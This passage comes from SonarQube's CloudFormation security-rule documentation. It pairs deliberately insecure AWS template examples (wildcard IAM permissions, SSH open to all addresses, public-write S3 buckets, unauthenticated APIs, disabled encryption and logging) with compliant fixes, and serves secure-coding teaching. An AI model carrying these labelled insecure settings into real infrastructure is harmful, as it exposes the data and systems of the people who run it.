    Type: 'AWS::MSK::Cluster'
    Properties:
      ClusterName: MSKCluster
      EncryptionInfo:
        EncryptionInTransit:
          ClientBroker: TLS
          InCluster: true
</pre>
<h2>See</h2>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/200">CWE-200 - Exposure of Sensitive Information to an Unauthorized Actor</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/319">CWE-319 - Cleartext Transmission of Sensitive Information</a> </li>
  <li> <a href="https://security.googleblog.com/2016/09/moving-towards-more-secure-web.html">Google, Moving towards more secure web</a> </li>
  <li> <a href="https://blog.mozilla.org/security/2015/04/30/deprecating-non-secure-http/">Mozilla, Deprecating non secure http</a> </li>
  <li> <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/load-balancer-listeners.html">AWS Documentation</a> - Listeners
  for your Application Load Balancers </li>
  <li> <a href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-properties-kinesis-stream-streamencryption.html">AWS
  Documentation</a> - Stream Encryption </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6302">
              cloudformation:S6302
            </a>
          </td>
          <td>
            <details>
              <p>A policy that grants all permissions may indicate an improper access control, which violates <a
href="https://en.wikipedia.org/wiki/Principle_of_least_privilege">the principle of least privilege</a>. Suppose an identity is granted full
permissions to a resource even though it only requires read permission to work as expected. In this case, an unintentional overwriting of resources
may occur and therefore result in loss of information.</p>
<h2>Ask Yourself Whether</h2>
<p>Identities obtaining all the permissions:</p>
<ul>
  <li> only require a subset of these permissions to perform the intended function. </li>
  <li> have monitored activity showing that only a subset of these permissions is actually used. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to apply the least privilege principle, i.e. by only granting the necessary permissions to identities. A good practice is to start
with the very minimum set of permissions and to refine the policy over time. In order to fix overly permissive policies already deployed in
production, a strategy could be to review the monitored activity in order to reduce the set of permissions to those most used.</p>
<h2>Sensitive Code Example</h2>
<p>A customer-managed policy that grants all permissions by using the wildcard (*) in the <code>Action</code> property:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: "2012-10-17"
            Statement:
                - Effect: Allow
                  Action:
                    - "*" # Sensitive
                  Resource:
                    - !Ref MyResource
        Roles:
            - !Ref MyRole
</pre>
<h2>Compliant Solution</h2>
<p>A customer-managed policy that grants only the required permissions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExamplePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
        PolicyDocument:
            Version: "2012-10-17"
            Statement:
                - Effect: Allow
                  Action:
                    - "s3:GetObject"
                  Resource:
                    - !Ref MyResource
        Roles:
            - !Ref MyRole
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/best-practices.html#grant-least-privilege">AWS Documentation</a> - Grant least
  privilege </li>
  <li> <a href="https://cloud.google.com/iam/docs/understanding-roles">Google Cloud Documentation</a> - Understanding roles </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6308">
              cloudformation:S6308
            </a>
          </td>
          <td>
            <details>
              <p>Amazon Elasticsearch Service (ES) is a managed service to host Elasticsearch instances.</p>
<p>To harden domain (cluster) data in case of unauthorized access, ES provides data-at-rest encryption if the Elasticsearch version is 5.1 or above.
Enabling encryption at rest will help protect:</p>
<ul>
  <li> indices </li>
  <li> logs </li>
  <li> swap files </li>
  <li> data in the application directory </li>
  <li> automated snapshots </li>
</ul>
<p>Thus, if adversaries gain physical access to the storage medium, they cannot access the data.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The database contains sensitive data that could cause harm when leaked. </li>
  <li> There are compliance requirements for the service to store data encrypted. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It is recommended to encrypt Elasticsearch domains that contain sensitive information.</p>
<p>Encryption and decryption are handled transparently by ES, so no further modifications to the application are necessary.</p>
<h2>Sensitive Code Example</h2>
<p>For <a
href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html">AWS::Elasticsearch::Domain</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Elasticsearch:
    Type: AWS::Elasticsearch::Domain
    Properties:
      EncryptionAtRestOptions:
        Enabled: false  # Sensitive, disabled by default
</pre>
<h2>Compliant Solution</h2>
<p>For <a
href="https://docs.aws.amazon.com/AWSCloudFormation/latest/UserGuide/aws-resource-elasticsearch-domain.html">AWS::Elasticsearch::Domain</a>:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  Elasticsearch:
    Type: AWS::Elasticsearch::Domain
    Properties:
      EncryptionAtRestOptions:
        Enabled: true
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/elasticsearch-service/latest/developerguide/encryption-at-rest.html">AWS Documentation</a> - Encryption of
  data at rest for Amazon Elasticsearch Service </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/311">CWE-311 - Missing Encryption of Sensitive Data</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6321">
              cloudformation:S6321
            </a>
          </td>
          <td>
            <details>
              <h2>Why is this an issue?</h2>
<p>Cloud platforms such as AWS support virtual firewalls that can be used to restrict access to services by controlling inbound and outbound
traffic.<br> Any firewall rule allowing traffic from all IP addresses to standard network ports on which administration services traditionally listen,
such as 22 for SSH, can expose these services to exploits and unauthorized access.</p>
<h3>What is the potential impact?</h3>
<p>Like any other service, administration services can contain vulnerabilities. Administration services run with elevated privileges and thus a
vulnerability could have a high impact on the system.</p>
<p>Additionally, credentials might be leaked through phishing or similar techniques. Attackers who are able to reach the services could use the
credentials to log in to the system.</p>
<h2>How to fix it</h2>
<p>It is recommended to restrict access to remote administration services to only trusted IP addresses. In practice, trusted IP addresses are those
held by system administrators or those of <a href="https://aws.amazon.com/quickstart/architecture/linux-bastion/?nc1=h_ls">bastion-like</a>
servers.</p>
<h3>Code examples</h3>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      VpcId: !Ref ExampleVpc
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 22
          ToPort: 22 # SSH traffic
          CidrIp: "0.0.0.0/0" # from all IP addresses is authorized
</pre>
<h4>Compliant solution</h4>
<pre data-diff-id="1" data-diff-type="compliant">
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleSecurityGroup:
    Type: AWS::EC2::SecurityGroup
    Properties:
      VpcId: !Ref ExampleVpc
      SecurityGroupIngress:
        - IpProtocol: tcp
          FromPort: 22
          ToPort: 22
          CidrIp: "1.2.3.0/24"
</pre>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> <a href="https://docs.aws.amazon.com/vpc/latest/userguide/VPC_SecurityGroups.html">AWS Documentation</a> - Security groups for your VPC </li>
  <li> <a href="https://docs.microsoft.com/en-us/azure/virtual-network/network-security-groups-overview">Azure Documentation</a> - Network security
  groups </li>
  <li> <a href="https://cloud.google.com/vpc/docs/using-firewalls">GCP Documentation</a> - Firewalls </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6265">
              cloudformation:S6265
            </a>
          </td>
          <td>
            <details>
              <p>Predefined permissions, also known as <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">canned ACLs</a>,
are an easy way to grant large privileges to predefined groups or users.</p>
<p>The following canned ACLs are security-sensitive:</p>
<ul>
  <li> <code>PublicRead</code>, <code>PublicReadWrite</code> grant respectively "read" and "read and write" privileges to everyone in the world
  (<code>AllUsers</code> group). </li>
  <li> <code>AuthenticatedRead</code> grants "read" privilege to all authenticated users (<code>AuthenticatedUsers</code> group). </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to implement the least privilege policy, ie to grant necessary permissions only to users for their required tasks. In the context
of canned ACL, set it to <code>private</code> (the default one) and if needed more granularity then use an appropriate S3 policy.</p>
<h2>Sensitive Code Example</h2>
<p>All users (ie: anyone in the world authenticated or not) have read and write permissions with the <code>PublicReadWrite</code> access control:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Sensitive
    Properties:
      BucketName: "mynoncompliantbucket"
      AccessControl: "PublicReadWrite"
</pre>
<h2>Compliant Solution</h2>
<p>With the <code>private</code> access control (default), only the bucket owner has the read/write permissions on the buckets and its ACL.</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Compliant
    Properties:
      BucketName: "mycompliantbucket"
      AccessControl: "Private"
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/acl-overview.html#canned-acl">AWS Documentation</a> - Access control list (ACL)
  overview (canned ACLs) </li>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/walkthrough1.html">AWS Documentation</a> - Controlling access to a bucket with
  user policies </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/732">CWE-732 - Incorrect Permission Assignment for Critical Resource</a> </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6281">
              cloudformation:S6281
            </a>
          </td>
          <td>
            <details>
              <p>By default S3 buckets are private, it means that only the bucket owner can access it.</p>
<p>This access control can be relaxed with ACLs or policies.</p>
<p>To prevent permissive policies to be set on a S3 bucket the following settings can be configured:</p>
<ul>
  <li> <code>BlockPublicAcls</code>: to block or not public ACLs to be set to the S3 bucket. </li>
  <li> <code>IgnorePublicAcls</code>: to consider or not existing public ACLs set to the S3 bucket. </li>
  <li> <code>BlockPublicPolicy</code>: to block or not public policies to be set to the S3 bucket. </li>
  <li> <code>RestrictPublicBuckets</code>: to restrict or not the access to the S3 endpoints of public policies to the principals within the bucket
  owner account. </li>
</ul>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The S3 bucket stores sensitive data. </li>
  <li> The S3 bucket is not used to store static resources of websites (images, css …​). </li>
  <li> Many users have the permission to set ACL or policy to the S3 bucket. </li>
  <li> These settings are not already enforced to true at the account level. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>It’s recommended to configure:</p>
<ul>
  <li> <code>BlockPublicAcls</code> to <code>true</code> to block new attempts to set public ACLs. </li>
  <li> <code>IgnorePublicAcls</code> to <code>true</code> to block existing public ACLs. </li>
  <li> <code>BlockPublicPolicy</code> to <code>true</code> to block new attempts to set public policies. </li>
  <li> <code>RestrictPublicBuckets</code> to <code>true</code> to restrict existing public policies. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>By default, when not set, the <code>PublicAccessBlockConfiguration</code> is fully deactivated (nothing is blocked):</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucketdefault:
    Type: 'AWS::S3::Bucket' # Sensitive
    Properties:
      BucketName: "example"
</pre>
<p>This <code>PublicAccessBlockConfiguration</code> allows public ACL to be set:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Sensitive
    Properties:
      BucketName: "example"
      PublicAccessBlockConfiguration:
        BlockPublicAcls: false # should be true
        BlockPublicPolicy: true
        IgnorePublicAcls: true
        RestrictPublicBuckets: true
</pre>
<h2>Compliant Solution</h2>
<p>This <code>PublicAccessBlockConfiguration</code> blocks public ACLs and policies, ignores existing public ACLs and restricts existing public
policies:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Compliant
    Properties:
      BucketName: "example"
      PublicAccessBlockConfiguration:
        BlockPublicAcls: true
        BlockPublicPolicy: true
        IgnorePublicAcls: true
        RestrictPublicBuckets: true
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/access-control-block-public-access.html">AWS Documentation</a> - Blocking public
  access to your Amazon S3 storage </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6317">
              cloudformation:S6317
            </a>
          </td>
          <td>
            <details>
              <p>Within IAM, identity-based policies grant permissions to users, groups, or roles, and enable specific actions to be performed on designated
resources. When an identity policy inadvertently grants more privileges than intended, certain users or roles might be able to perform more actions
than expected. This can lead to potential security risks, as it enables malicious users to escalate their privileges from a lower level to a higher
level of access.</p>
<h2>Why is this an issue?</h2>
<p>AWS Identity and Access Management (IAM) is the service that defines access to AWS resources. One of the core components of IAM is the policy
which, when attached to an identity or a resource, defines its permissions. Policies granting permission to an identity (a user, a group or a role)
are called identity-based policies. They add the ability to an identity to perform a predefined set of actions on a list of resources.</p>
<p>For such policies, it is easy to define very broad permissions (by using wildcard <code>"*"</code> permissions for example.) This is especially
true if it is not yet clear which permissions will be required for a specific workload or use case. However, it is important to limit the amount of
permissions that are granted and the amount of resources to which these permissions are granted. Doing so ensures that there are no users or roles
that have more permissions than they need.</p>
<p>If this is not done, it can potentially carry security risks in the case that an attacker gets access to one of these identities.</p>
<h3>What is the potential impact?</h3>
<p>AWS IAM policies that contain overly broad permissions can lead to privilege escalation by granting users more access than necessary. They may be
able to perform actions beyond their intended scope.</p>
<h4>Privilege escalation</h4>
<p>When IAM policies are too permissive, they grant users more privileges than necessary, allowing them to perform actions that they should not be
able to. This can be exploited by attackers to gain unauthorized access to sensitive resources and perform malicious activities.</p>
<p>For example, if an IAM policy grants a user unrestricted access to all S3 buckets in an AWS account, the user can potentially read, write, and
delete any object within those buckets. If an attacker gains access to this user’s credentials, they can exploit this overly permissive policy to
exfiltrate sensitive data, modify or delete critical files, or even launch further attacks within the AWS environment. This can have severe
consequences, such as data breaches, service disruptions, or unauthorized access to other resources within the AWS account.</p>
<h2>How to fix it in Identity and Access Management</h2>
<h3>Code examples</h3>
<p>In this example, the IAM policy allows an attacker to update the code of any Lambda function. An attacker can achieve privilege escalation by
altering the code of a Lambda that executes with high privileges.</p>
<h4>Noncompliant code example</h4>
<pre data-diff-id="1" data-diff-type="noncompliant">
AWSTemplateFormatVersion: 2010-09-09

Resources:
  # Update Lambda code
  lambdaUpdatePolicy:
    # Noncompliant
    Type: AWS::IAM::ManagedPolicy
    Properties:
      ManagedPolicyName: lambdaUpdatePolicy
      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Action:
              - lambda:UpdateFunctionCode
            Resource: "*"
</pre>
<h4>Compliant solution</h4>
<p>The policy is narrowed such that only updates to the code of certain Lambda functions (without high privileges) are allowed.</p>
<pre data-diff-id="1" data-diff-type="compliant">
AWSTemplateFormatVersion: 2010-09-09

Resources:
  # Update Lambda code
  lambdaUpdatePolicy:
    Type: AWS::IAM::ManagedPolicy
    Properties:
      ManagedPolicyName: lambdaUpdatePolicy
      PolicyDocument:
        Version: "2012-10-17"
        Statement:
          - Effect: Allow
            Action:
              - lambda:UpdateFunctionCode
            Resource: "arn:aws:lambda:us-east-2:123456789012:function:my-function:1"
</pre>
<h3>How does this work?</h3>
<h4>Principle of least privilege</h4>
<p>When creating IAM policies, it is important to adhere to the principle of least privilege. This means that any user or role should only be granted
enough permissions to perform the tasks that they are supposed to, and <em>nothing else</em>.</p>
<p>To successfully implement this, it is easier to start from nothing and gradually build up all the needed permissions. When starting from a policy
with overly broad permissions which is made stricter at a later time, it can be harder to ensure that there are no gaps that might be forgotten about.
In this case, it might be useful to monitor the users or roles to verify which permissions are used.</p>
<h2>Resources</h2>
<h3>Documentation</h3>
<ul>
  <li> AWS Documentation - <a href="https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies.html#grant-least-priv">Policies and permissions
  in IAM: Grant least privilege</a> </li>
</ul>
<h3>Articles &amp; blog posts</h3>
<ul>
  <li> Rhino Security Labs - <a href="https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/">AWS IAM Privilege Escalation -
  Methods and Mitigation</a> </li>
</ul>
<h3>Standards</h3>
<ul>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-269 - Improper Privilege Management</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6333">
              cloudformation:S6333
            </a>
          </td>
          <td>
            <details>
              <p>Creating APIs without authentication unnecessarily increases the attack surface on the target infrastructure.</p>
<p>Unless another authentication method is used, attackers have the opportunity to attempt attacks against the underlying API.<br> This means attacks
both on the functionality provided by the API and its infrastructure.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> The underlying API exposes all of its contents to any anonymous Internet user. </li>
</ul>
<p>There is a risk if you answered yes to this question.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>In general, prefer limiting API access to a specific set of people or entities.</p>
<p>AWS provides multiple methods to do so:</p>
<ul>
  <li> <code>AWS_IAM</code>, to use standard AWS IAM roles and policies. </li>
  <li> <code>COGNITO_USER_POOLS</code>, to use customizable OpenID Connect (OIDC) identity providers (IdP). </li>
  <li> <code>CUSTOM</code>, to use an AWS-independant OIDC provider, glued to the infrastructure with a Lambda authorizer. </li>
</ul>
<h2>Sensitive Code Example</h2>
<p>A public API that doesn’t have access control implemented:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleMethod:
    Type: AWS::ApiGateway::Method
    Properties:
      AuthorizationType: NONE # Sensitive
      HttpMethod: GET
</pre>
<p>A Serverless Application Model (SAM) API resource that is public by default:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleApi: # Sensitive
    Type: AWS::Serverless::Api
    Properties:
      StageName: Prod
</pre>
<h2>Compliant Solution</h2>
<p>An API that implements AWS IAM permissions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleMethod:
    Type: AWS::ApiGateway::Method
    Properties:
      AuthorizationType: AWS_IAM
      HttpMethod: GET
</pre>
<p>A Serverless Application Model (SAM) API resource that has to be requested using a key:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ExampleApi:
    Type: AWS::Serverless::Api
    Properties:
      StageName: Prod
      Auth:
        ApiKeyRequired: true
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/apigateway/latest/developerguide/apigateway-control-access-to-api.html">AWS Documentation</a> -
  Controlling and managing access to a REST API in API Gateway </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/284">CWE-284 - Improper Access Control</a> </li>
</ul>
            </details>
          </td>
        </tr>
        
        <tr>
          <td><a href="https://next.sonarqube.com/sonarqube/coding_rules#rule_key=cloudformation:S6258">
              cloudformation:S6258
            </a>
          </td>
          <td>
            <details>
              <p>Disabling logging of this component can lead to missing traceability in case of a security incident.</p>
<p>Logging allows operational and security teams to get detailed and real-time feedback on an information system’s events. The logging coverage
enables them to quickly react to events, ranging from the most benign bugs to the most impactful security incidents, such as intrusions.</p>
<p>Apart from security detection, logging capabilities also directly influence future digital forensic analyses. For example, detailed logging will
allow investigators to establish a timeline of the actions perpetrated by an attacker.</p>
<h2>Ask Yourself Whether</h2>
<ul>
  <li> This component is essential for the information system infrastructure. </li>
  <li> This component is essential for mission-critical functions. </li>
  <li> Compliance policies require this component to be monitored. </li>
</ul>
<p>There is a risk if you answered yes to any of those questions.</p>
<h2>Recommended Secure Coding Practices</h2>
<p>Enable the logging capabilities of this component. Depending on the component, new permissions might be required by the logging storage
components.<br> You should consult the official documentation to enable logging for the impacted components. For example, AWS Application Load
Balancer Access Logs <a href="https://docs.aws.amazon.com/elasticloadbalancing/latest/application/enable-access-logging.html">require an additional
bucket policy</a>.</p>
<h2>Sensitive Code Example</h2>
<p>For <a href="https://aws.amazon.com/s3/">Amazon S3 access requests</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3Bucket:
    Type: 'AWS::S3::Bucket' # Sensitive
    Properties:
      BucketName: "mynoncompliantbucket"
</pre>
<p>For <a href="https://aws.amazon.com/api-gateway/">Amazon API Gateway</a> stages:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Prod: # Sensitive
    Type: AWS::ApiGateway::Stage
    Properties:
      StageName: Prod
      Description: Prod Stage
      TracingEnabled: false # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/neptune/">Amazon Neptune</a> clusters:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Cluster:
    Type: AWS::Neptune::DBCluster
    Properties:
      EnableCloudwatchLogsExports: []  # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/msk/">Amazon MSK</a> broker logs:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  SensitiveCluster:
    Type: 'AWS::MSK::Cluster'
    Properties:
      ClusterName: Sensitive Cluster
      LoggingInfo:
        BrokerLogs: # Sensitive
          CloudWatchLogs:
            Enabled: false
            LogGroup: CWLG
          Firehose:
            DeliveryStream: DS
            Enabled: false
</pre>
<p>For <a href="https://aws.amazon.com/documentdb/">Amazon DocDB</a>:</p>
<pre>
AWSTemplateFormatVersion: "2010-09-09"
Resources:
  DocDBOmittingLogs: # Sensitive
    Type: "AWS::DocDB::DBCluster"
    Properties:
      DBClusterIdentifier : "DB Without Logs"
</pre>
<p>For <a href="https://aws.amazon.com/amazon-mq/">Amazon MQ</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Broker:
    Type: AWS::AmazonMQ::Broker
    Properties:
      Logs:  # Sensitive
        Audit: false
        General: false
</pre>
<p>For <a href="https://aws.amazon.com/redshift/">Amazon Redshift</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ClusterOmittingLogging: # Sensitive
    Type: "AWS::Redshift::Cluster"
    Properties:
      DBName: "Redshift Warehouse Cluster"
</pre>
<p>For <a href="https://aws.amazon.com/opensearch-service/">Amazon OpenSearch</a> service or Amazon Elasticsearch service:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  OpenSearchServiceDomain:
    Type: 'AWS::OpenSearchService::Domain'
    Properties:
      LogPublishingOptions: # Sensitive
        ES_APPLICATION_LOGS:
          CloudWatchLogsLogGroupArn: 'arn:aws:logs:us-east-1:1234:log-group:es-application-logs'
          Enabled: true
        INDEX_SLOW_LOGS:
          CloudWatchLogsLogGroupArn: 'arn:aws:logs:us-east-1:1234:log-group:es-index-slow-logs'
          Enabled: true
</pre>
<p>For <a href="https://aws.amazon.com/cloudfront/">Amazon CloudFront</a> distributions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  CloudFrontDistribution: # Sensitive
    Type: AWS::CloudFront::Distribution
    Properties:
      DistributionConfig:
        DefaultRootObject: "index.html"
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/">Amazon Elastic Load Balancing</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  LoadBalancer:
      Type: AWS::ElasticLoadBalancing::LoadBalancer
      Properties:
        AccessLoggingPolicy:
          Enabled: false # Sensitive
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/">Amazon Load Balancing (v2)</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ApplicationLoadBalancer:
   Type: AWS::ElasticLoadBalancingV2::LoadBalancer
   Properties:
     Name: CompliantLoadBalancer
     LoadBalancerAttributes:
       - Key: "access_logs.s3.enabled"
         Value: false # Sensitive
</pre>
<h2>Compliant Solution</h2>
<p>For <a href="https://aws.amazon.com/s3/">Amazon S3 access requests</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  S3BucketLogs:
    Type: 'AWS::S3::Bucket'
    Properties:
      BucketName: "mycompliantloggingbucket"
      AccessControl: LogDeliveryWrite

  S3Bucket:
    Type: 'AWS::S3::Bucket'
    Properties:
      BucketName: "mycompliantbucket"
      LoggingConfiguration:
        DestinationBucketName: !Ref S3BucketLogs
        LogFilePrefix: testing-logs
</pre>
<p>For <a href="https://aws.amazon.com/api-gateway/">Amazon API Gateway</a> stages:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Prod:
    Type: AWS::ApiGateway::Stage
    Properties:
      StageName: Prod
      Description: Prod Stage
      TracingEnabled: true
      AccessLogSetting:
        DestinationArn: "arn:aws:logs:eu-west-1:123456789:test"
        Format: "..."
</pre>
<p>For <a href="https://aws.amazon.com/neptune/">Amazon Neptune</a> clusters:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Cluster:
    Type: AWS::Neptune::DBCluster
    Properties:
      EnableCloudwatchLogsExports: ["audit"]
</pre>
<p>For <a href="https://aws.amazon.com/msk/">Amazon MSK</a> broker logs:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  SensitiveCluster:
    Type: 'AWS::MSK::Cluster'
    Properties:
      ClusterName: Sensitive Cluster
      LoggingInfo:
        BrokerLogs:
          Firehose:
            DeliveryStream: DS
            Enabled: true
          S3:
            Bucket: Broker Logs
            Enabled: true
            Prefix: "logs/msk-brokers-"
</pre>
<p>For <a href="https://aws.amazon.com/documentdb/">Amazon DocDB</a>:</p>
<pre>
AWSTemplateFormatVersion: "2010-09-09"
Resources:
  DocDBWithLogs:
    Type: "AWS::DocDB::DBCluster"
    Properties:
      DBClusterIdentifier : "DB With Logs"
      EnableCloudwatchLogsExports:
         - audit
</pre>
<p>For <a href="https://aws.amazon.com/amazon-mq/">Amazon MQ</a> enable <code>Audit</code> or <code>General</code>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  Broker:
    Type: AWS::AmazonMQ::Broker
    Properties:
      Logs:
        Audit: true
        General: true
</pre>
<p>For <a href="https://aws.amazon.com/redshift/">Amazon Redshift</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  CompliantCluster:
    Type: "AWS::Redshift::Cluster"
    Properties:
      DBName: "Redshift Warehouse Cluster"
      LoggingProperties:
        BucketName: "Infra Logs"
        S3KeyPrefix: "log/redshift-"
</pre>
<p>For <a href="https://aws.amazon.com/opensearch-service/">Amazon OpenSearch</a> service, or Amazon Elasticsearch service:</p>
<pre>
AWSTemplateFormatVersion: '2010-09-09'
Resources:
  OpenSearchServiceDomain:
    Type: 'AWS::OpenSearchService::Domain'
    Properties:
      LogPublishingOptions:
        AUDIT_LOGS:
          CloudWatchLogsLogGroupArn: 'arn:aws:logs:us-east-1:1234:log-group:es-audit-logs'
          Enabled: true
</pre>
<p>For <a href="https://aws.amazon.com/cloudfront/">Amazon CloudFront</a> distributions:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  CloudFrontDistribution:
    Type: AWS::CloudFront::Distribution
    Properties:
      DistributionConfig:
        DefaultRootObject: "index.html"
        Logging:
          Bucket: "mycompliantbucket"
          Prefix: "log/cloudfront-"
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/">Amazon Elastic Load Balancing</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  LoadBalancer:
      Type: AWS::ElasticLoadBalancing::LoadBalancer
      Properties:
        AccessLoggingPolicy:
          Enabled: true
          S3BucketName: mycompliantbucket
          S3BucketPrefix: "log/loadbalancer-"
</pre>
<p>For <a href="https://aws.amazon.com/elasticloadbalancing/">Amazon Load Balancing (v2)</a>:</p>
<pre>
AWSTemplateFormatVersion: 2010-09-09
Resources:
  ApplicationLoadBalancer:
   Type: AWS::ElasticLoadBalancingV2::LoadBalancer
   Properties:
     Name: CompliantLoadBalancer
     LoadBalancerAttributes:
       - Key: "access_logs.s3.enabled"
         Value: true
       - Key: "access_logs.s3.bucket"
         Value: "mycompliantbucket"
       - Key: "access_logs.s3.prefix"
         Value: "log/elbv2-"
</pre>
<h2>See</h2>
<ul>
  <li> <a href="https://docs.aws.amazon.com/AmazonS3/latest/userguide/ServerLogs.html">AWS Documentation</a> - Logging requests using server access
  logging </li>
  <li> CWE - <a href="https://cwe.mitre.org/data/definitions/778">CWE-778 - Insufficient Logging</a> </li>
